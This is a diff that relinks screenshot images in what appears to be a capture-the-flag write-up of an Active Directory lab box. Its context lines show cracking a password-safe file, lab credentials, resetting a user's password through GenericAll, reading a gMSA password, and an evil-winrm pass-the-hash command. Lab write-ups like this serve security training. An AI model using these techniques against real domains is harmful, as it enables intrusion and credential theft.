@@ -118,11 +118,11 @@ drw-rw-rw-          0  Thu Oct 15 16:19:47 2026 ..
 
 -Financial_Report.pdf
 
-![image.png](Kitsune/image%202.png)
+![Screenshot 2](./image/image%202.png)
 
 -Timesheet.pdf
 
-![image.png](Kitsune/image%203.png)
+![Screenshot 3](./image/image%203.png)
 
 -pwsafe
 
@@ -130,7 +130,7 @@ drw-rw-rw-          0  Thu Oct 15 16:19:47 2026 ..
 pwsafe logins.psafe3
 ```
 
-![image.png](Kitsune/image%204.png)
+![Screenshot 4](./image/image%204.png)
 
 The `logins.psafe3` file is password-protected. We can use John to crack the password.
 
@@ -162,7 +162,7 @@ Session completed.
 
 Some usernames and passwords were found.
 
-![image.png](Kitsune/image%205.png)
+![Screenshot 5](./image/image%205.png)
 
 ```jsx
 admin:a%KlRhqbuRgL
@@ -369,7 +369,7 @@ export KRB5CCNAME="$HOME/ctf/ranch.ccache"
 ls -l "$KRB5CCNAME"
 ```
 
-![image.png](Kitsune/image%206.png)
+![Screenshot 6](./image/image%206.png)
 
 With GenericAll Over a User ,You can reset user passwords with full control over user objects.
 
@@ -388,7 +388,7 @@ LDAP        10.0.22.196     389    DC01             [*] Windows 11 / Server 2025
 LDAP        10.0.22.196     389    DC01             [+] kitsune.local\schlop:NewP@ssw0rd123! 
 ```
 
-![image.png](Kitsune/image%207.png)
+![Screenshot 7](./image/image%207.png)
 
 **R**emote Management Users is a built-in Active Directory security group that lets members perform remote management of Windows systems—mainly through WinRM/WS-Management and WMI without necessarily making them full local administrators
 
@@ -439,9 +439,9 @@ pebble:PebbleIs47!
 
 ```
 
-![image.png](Kitsune/image%208.png)
+![Screenshot 8](./image/image%208.png)
 
-![image.png](Kitsune/image%209.png)
+![Screenshot 9](./image/image%209.png)
 
 A  gMSA’s password is automatically generated and rotated by domain controllers. AD stores the current and previous password material in msDS-ManagedPassword, but returns it only to principals listed in the gMSA’s msDS-GroupMSAMembership attribute
 
@@ -467,7 +467,7 @@ evil-winrm -i 10.0.22.196 \
   -H '085691c182d60ab1a12466ce7b50d29d'
 ```
 
-![image.png](Kitsune/image%2010.png)
+![Screenshot 10](./image/image%2010.png)
 
 **Backup Operators** is a built-in Active Directory/Windows group whose members can back up and restore files even when normal file permissions would deny access. On a Domain Controller, that can lead directly to dumping every domain credential
 
